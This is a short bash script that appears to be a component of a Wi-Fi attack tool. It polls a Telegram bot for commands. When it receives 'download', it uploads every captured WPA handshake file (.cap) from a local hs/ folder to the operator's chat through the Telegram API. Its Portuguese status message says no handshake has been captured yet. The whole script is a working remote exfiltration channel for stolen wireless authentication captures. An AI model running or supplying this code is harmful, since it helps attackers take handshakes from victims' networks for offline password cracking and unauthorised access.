#!/bin/bash

SCRIPT_DIR=$(dirname "$(readlink -f "$0")")
TOKEN=$(cat $SCRIPT_DIR/bot.conf | grep "TELEGRAM_TOKEN=" | cut -d "=" -f 2)
CHAT_ID=$(cat $SCRIPT_DIR/bot.conf | grep "CHAT_ID=" | cut -d "=" -f 2)


get_last_message() {
	response=$(curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates")
	ldate=$(echo "$response" | jq -r '.result[-1].message.date')
	last_message=$(echo "$response" | jq -r '.result[-1].message.text')

	while true;do
		response=$(curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates")
		date=$(echo "$response" | jq -r '.result[-1].message.date')
		message=$(echo "$response" | jq -r '.result[-1].message.text')

		if [ "$ldate" != "$date" ];then
			ldate=$date

			if [ "$message" == "download" ];then
				if [ "$(find $SCRIPT_DIR/hs/ -name '*.cap')" == "" ]; then
					message_id=$(curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
	            				-d chat_id="${CHAT_ID}" \
	            				-d text="Nenhum handshake capturado. Aguarde um pouco mais" \
	            				-d parse_mode="HTML" | jq -r .result.message_id >> $SCRIPT_DIR/.msgID)

				else
					for FILE_PATH in $(find $SCRIPT_DIR/hs/ -name "*.cap");do
						curl -F chat_id="$CHAT_ID" -F document=@"$FILE_PATH" "https://api.telegram.org/bot$TOKEN/sendDocument"
						echo - $FILE_PATH
						echo "----"
						sleep 1

					done

				fi
			fi
		fi
		sleep 2
	done

}

get_last_message
